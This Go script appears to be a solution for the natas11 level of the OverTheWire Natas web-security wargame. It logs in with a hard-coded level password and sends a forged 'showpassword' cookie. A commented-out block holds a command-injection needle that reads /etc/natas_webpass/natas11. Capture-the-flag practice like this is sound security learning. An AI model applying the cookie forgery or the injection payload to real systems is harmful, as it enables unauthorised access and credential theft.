package main

import (
	"fmt"
	"net/http"
	"io/ioutil"
	// "net/url"
	// "regexp"
	// "strings"
)

var (
	username = "natas11"
	password = "1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg"
	urls = fmt.Sprintf("http://%s.natas.labs.overthewire.org/",username) 
)

func main (){
	request, _ := http.NewRequest("GET", urls, nil)
	cookies := &http.Cookie{Name: "showpassword", Value: "yes"}
	request.AddCookie(cookies)

	
	// data := url.Values{}
	// data.Set("needle", ".* /etc/natas_webpass/natas11 #")
	// data.Set("submit", "submit")

	// request, _ := http.NewRequest("POST", urls, strings.NewReader(data.Encode()))
	request.SetBasicAuth(username, password)
	// request.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	response, _:= http.DefaultClient.Do(request)
	defer response.Body.Close()
	content ,_ := ioutil.ReadAll(response.Body)
	fmt.Println(string(content))
	// regex := regexp.MustCompile(`natas11(.*)\n</pre>`)
	// almost := strings.Split(regex.FindAllString(string(content), 1)[0], "\n")[0]
	// answer := strings.Split(almost, ":")[1]
	// fmt.Println(answer)
}
